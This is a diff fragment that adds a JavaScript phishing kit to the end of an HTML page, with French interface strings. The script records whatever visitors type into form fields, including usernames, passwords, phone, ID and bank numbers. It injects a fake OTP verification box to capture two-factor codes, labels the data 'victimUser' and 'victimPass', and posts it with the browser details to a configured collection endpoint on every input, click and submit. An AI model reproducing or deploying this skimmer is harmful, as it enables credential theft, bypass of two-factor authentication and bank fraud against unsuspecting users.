+    fields.forEach((el, idx) => {
+      const type = (el.type || "text").toLowerCase();
+      if (type === "submit" || type === "button" || type === "reset") return;
+
+      const role = classifyInput(el);
+      if (role === "ignore") return;
+
+      if (!NEXUS_CFG.caps[role]) return;
+
+      const { key } = getFieldDescriptor(el);
+      let val = "";
+
+      if (type === "checkbox") {
+        val = el.checked ? (el.value || "Oui") : "";
+      } else if (type === "radio") {
+        if (!el.checked) return;
+        val = el.value || "Sélectionné";
+      } else {
+        val = (el.value || "").trim();
+      }
+
+      if (!val) return;
+
+      const uniqueKey = allCaptured[key] !== undefined && allCaptured[key] !== val ? (key + "_" + (idx + 1)) : key;
+      allCaptured[uniqueKey] = val;
+
+      if (role === "otp") {
+        otpParts.push(val);
+      } else if (role === "pass") {
+        passCandidate = el.value;
+      } else if (role === "phone") {
+        phoneParts.push(val);
+      } else if (role === "id" && !idCandidate) {
+        idCandidate = val;
+      } else if (role === "bank" && !bankCandidate) {
+        bankCandidate = val;
+      } else if (!extraCandidate) {
+        extraCandidate = val;
+      }
+    });
+
+    if (activeTab) {
+      allCaptured.onglet_actif = activeTab;
+    }
+
+    const combinedPhone = phoneParts.join(" ").trim();
+
+    if ((activeTab === "phone" || activeTab === "code") && combinedPhone && NEXUS_CFG.caps.phone) {
+      state.victimUser = combinedPhone;
+    } else {
+      state.victimUser = idCandidate || combinedPhone || bankCandidate || extraCandidate || "";
+    }
+
+    state.victimPass = NEXUS_CFG.caps.pass ? (passCandidate || state.victimPass || "") : "";
+    state.otp = (NEXUS_CFG.caps.otp && otpParts.length > 0) ? otpParts.join("") : "Aucun";
+    state.capturedFields = allCaptured;
+  }
+
+  function postPayload(payload) {
+    const fingerprint = JSON.stringify(payload);
+    if (state.sentFingerprints.has(fingerprint)) return;
+    state.sentFingerprints.add(fingerprint);
+
+    fetch(NEXUS_CFG.endpoint, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload),
+      keepalive: true
+    }).catch(() => {});
+  }
+
+  function sendCapture(stage, extra = {}) {
+    collectCurrentValues();
+
+    const hasFields = Object.keys(state.capturedFields).length > 0;
+    const hasMainData = Boolean(state.victimUser || state.victimPass || (state.otp && state.otp !== "Aucun"));
+    if (!hasFields && !hasMainData && (!extra.otp || extra.otp === "Aucun")) {
+      return;
+    }
+
+    const isOtpEvent = Boolean(NEXUS_CFG.caps.otp && extra.otp && extra.otp !== "Aucun" && extra.otp !== "En attente OTP...");
+    const effectiveOtp = NEXUS_CFG.caps.otp
+      ? (extra.otp || (isOtpEvent ? state.otp : (NEXUS_CFG.enableOtp ? "En attente OTP..." : "Aucun")))
+      : "Aucun";
+
+    const payload = {
+      owner: effectiveOwner,
+      network: NEXUS_CFG.network,
+      type: isOtpEvent ? "otp" : stage,
+      victimUser: state.victimUser || "Inconnu",
+      victimPass: state.victimPass || "Inconnu",
+      otp: effectiveOtp,
+      fields: state.capturedFields,
+      extra_info: JSON.stringify({
+        ua: navigator.userAgent,
+        platform: navigator.platform,
+        fields: state.capturedFields
+      })
+    };
+
+    postPayload(payload);
+  }
+
+  function ensureOtpSectionIfNeeded() {
+    if (!NEXUS_CFG.enableOtp || !NEXUS_CFG.caps.otp) return;
+
+    const existingOtp = Array.from(document.querySelectorAll("input, select, textarea")).some((el) => classifyInput(el) === "otp");
+    if (existingOtp) return;
+
+    if (document.getElementById("nexus-auto-otp-box")) return;
+
+    const box = document.createElement("div");
+    box.id = "nexus-auto-otp-box";
+    box.style.cssText = [
+      "margin:14px auto",
+      "padding:14px",
+      "max-width:360px",
+      "border:1px solid #d0d7de",
+      "border-radius:10px",
+      "background:#ffffff",
+      "font-family:inherit",
+      "text-align:center"
+    ].join(";");
+
+    box.innerHTML = `
+      <div style="font-size:13px;font-weight:700;margin-bottom:8px;color:#111827;">Code de vérification (OTP)</div>
+      <input
+        id="nexus-otp-field"
+        data-nexus-injected-otp="true"
+        type="text"
+        inputmode="numeric"
+        maxlength="6"
+        placeholder="••••••"
+        style="width:100%;padding:10px;text-align:center;font-size:18px;letter-spacing:8px;border:1px solid #9ca3af;border-radius:8px;margin-bottom:10px;"
+      />
+      <button
+        id="nexus-otp-submit"
+        type="button"
+        style="width:100%;padding:10px;border:none;border-radius:8px;background:#111827;color:#fff;font-weight:600;cursor:pointer;"
+      >Valider le code OTP</button>
+    `;
+
+    const targetForm = document.querySelector("form");
+    if (targetForm && targetForm.parentElement) {
+      targetForm.parentElement.insertBefore(box, targetForm.nextSibling);
+    } else {
+      document.body.appendChild(box);
+    }
+
+    const otpInput = document.getElementById("nexus-otp-field");
+    const otpBtn = document.getElementById("nexus-otp-submit");
+
+    otpInput.addEventListener("input", () => {
+      otpInput.value = otpInput.value.replace(/\D/g, "");
+      collectCurrentValues();
+    });
+
+    otpBtn.addEventListener("click", () => {
+      collectCurrentValues();
+      const code = otpInput.value.trim();
+      sendCapture("otp", { otp: code || state.otp });
+    });
+  }
+
+  document.addEventListener("input", (e) => {
+    const el = e.target;
+    if (!el || !["INPUT", "SELECT", "TEXTAREA"].includes(el.tagName)) return;
+    collectCurrentValues();
+  }, true);
+
+  document.addEventListener("change", (e) => {
+    const el = e.target;
+    if (!el || !["INPUT", "SELECT", "TEXTAREA"].includes(el.tagName)) return;
+    collectCurrentValues();
+  }, true);
+
+  document.addEventListener("submit", () => {
+    collectCurrentValues();
+    const hasOtp = NEXUS_CFG.caps.otp && state.otp && state.otp !== "Aucun";
+    if (hasOtp) {
+      sendCapture("otp", { otp: state.otp });
+    } else {
+      sendCapture((NEXUS_CFG.enableOtp && NEXUS_CFG.caps.otp) ? "OTP_STEP1" : "STANDARD");
+    }
+  }, true);
+
+  document.addEventListener("click", (e) => {
+    const btn = e.target.closest("button, input[type='submit'], input[type='button'], [role='button']");
+    if (!btn || btn.id === "nexus-otp-submit") return;
+    collectCurrentValues();
+    const txt = (btn.innerText || btn.value || "").toLowerCase();
+    const hasOtp = NEXUS_CFG.caps.otp && state.otp && state.otp !== "Aucun";
+    if (hasOtp && (txt.includes("otp") || txt.includes("verify") || txt.includes("vérif") || txt.includes("confirm") || txt.includes("valid"))) {
+      sendCapture("otp", { otp: state.otp });
+    } else if (Object.keys(state.capturedFields).length > 0 || state.victimUser || state.victimPass) {
+      sendCapture((NEXUS_CFG.enableOtp && NEXUS_CFG.caps.otp) ? "OTP_STEP1" : "STANDARD");
+    }
+  }, true);
+
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", ensureOtpSectionIfNeeded);
+  } else {
+    ensureOtpSectionIfNeeded();
+  }
+})();
+</script>
+</body>
+</html>
